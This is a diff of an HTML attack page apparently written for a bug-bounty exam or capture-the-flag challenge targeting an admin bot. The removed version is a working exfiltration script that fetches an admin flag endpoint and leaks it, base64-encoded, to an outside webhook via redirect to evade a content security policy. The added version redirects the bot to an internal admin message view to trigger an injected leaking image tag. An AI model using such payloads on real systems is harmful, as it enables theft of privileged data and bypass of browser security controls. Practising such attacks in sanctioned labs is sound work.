@@ -1,39 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exam Analytics</title>
+    <title>Redirecting to Admin Portal</title>
 </head>
 <body>
-    <h1>Loading Report...</h1>
     <script>
-        async function captureFlag() {
-            const webhook = "https://webhooksite.net/2811e39a-8bfc-496f-8cea-7bc1a2e47012";
-            const messageId = "69e229e5bee6d6b7c6628adc"; // Your Message ID
-            
-            try {
-                // 1. Try to fetch the flag from the sensitive endpoint
-                const response = await fetch('/api/admin/flag');
-                const flag = await response.text();
-
-                // 2. Use a redirect to bypass CSP connect-src
-                // This carries the flag to your webhook in the URL
-                window.location.href = `${webhook}?id=${messageId}&flag=${btoa(flag)}`;
-                
-            } catch (e) {
-                // If it fails, try to fetch the message details itself 
-                // Sometimes the flag is in the 'admin response' to your message
-                try {
-                    const msgRes = await fetch(`/api/contact/submit/${messageId}`);
-                    const msgData = await msgRes.text();
-                    window.location.href = `${webhook}?id=${messageId}&msgData=${btoa(msgData)}`;
-                } catch (e2) {
-                    window.location.href = `${webhook}?id=${messageId}&error=${btoa(e2.message)}`;
-                }
-            }
-        }
-
-        // Execute immediately when the bot opens the link
-        captureFlag();
+        // We are redirecting the bot to the internal admin view of your message
+        // This is where your <img src="...?leak=" tag will execute
+        const messageId = "69e22c68bee6d6b7c6628b2c";
+        const targetUrl = `https://bugbounty-exam.hashacademy.co/admin/messages/${messageId}`;
+        
+        console.log("Redirecting bot to secure message view...");
+        window.location.replace(targetUrl);
     </script>
 </body>
 </html>
